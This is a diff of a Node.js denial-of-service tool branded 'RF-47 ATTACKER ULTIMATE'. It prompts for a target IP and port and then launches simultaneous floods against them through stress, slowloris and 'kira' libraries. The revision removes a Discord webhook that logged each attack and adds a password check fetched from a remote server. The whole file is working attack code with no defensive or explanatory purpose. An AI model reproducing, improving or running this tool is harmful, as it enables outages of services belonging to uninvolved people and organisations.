@@ -1,33 +1,34 @@
-﻿const os = require("os");
-const Loris = require("@anzerr/slowloris.tool");
-const { Webhook } = require('discord-webhook-node');
+const os = require("os");
 const Stress = require("ddos-stress");
+const request = require("request");
+const Loris = require("@anzerr/slowloris.tool");
 const stress = new Stress ();
-const stress1 = new Stress ();
 
 var setTitle = require('console-title');
-setTitle('RF-47 ATTACKER ULTIMATE V2');
+setTitle('RF-47 ATTACKER ULTIMATE');
 const prompt = require("prompt-sync")();
-console.log(`╔════════════════════════════════════════════╗`.blue);
-console.log(`║             RF-47 Ultimate V2              ║`.blue);
-console.log(`╚════════════════════════════════════════════╝`.blue);
-console.log(`╔══[Input IP]`.blue);
-var IP = prompt(`╚════> `.blue);
-console.log(`╔══[Input PORT]`.blue);
-var PORT = prompt(`╚════> `.blue);
-const hook = new Webhook("");
-hook.send("** :rocket: [ Logs ] New Sending attack to " + IP +":"+ PORT +"**");
+console.log("RF-47 ATTACKER ULTIMATE")
+const pass = prompt(`RF-47 ULTIMATE Accses ( Password )> `.red)
+request('https://server.idproject.xyz/rf-47.txt', function (error, response, body) {
+  if (body === pass) {
+  }
+  else {
+    console.log(`Wrong Password !!`.red)
+    process.exit();
+  }
+});
+var IP = prompt(`Input IP > `.red);
+var PORT = prompt(`Input Port > `.red);
 var Kira = require('kira');
 var api = new Kira();
-var api1 = new Kira();
 
-stress.run(''+ IP +':'+ PORT +'', 7000)
-let l = new Loris('http://'+ IP +':'+ PORT +'', 7000).attack();
-api.kill('http://'+ IP +'', 700, 20000, 'https://'+ IP +':'+ PORT +'');
+stress.run(""+ IP +":"+ PORT +"", 5000)
+let l = new Loris("http://"+ IP +":"+ PORT +"", 300000).attack();
+api.kill('http://'+ IP +'', 200, 10000, 'https://'+ IP +':'+ PORT +'');
 
 return new Promise((resolve) => l.once("end", resolve))
   .then(() => {
-    console.log("attack stopped");
+    console.log("attack ended");
   })
   .catch(console.log);
 
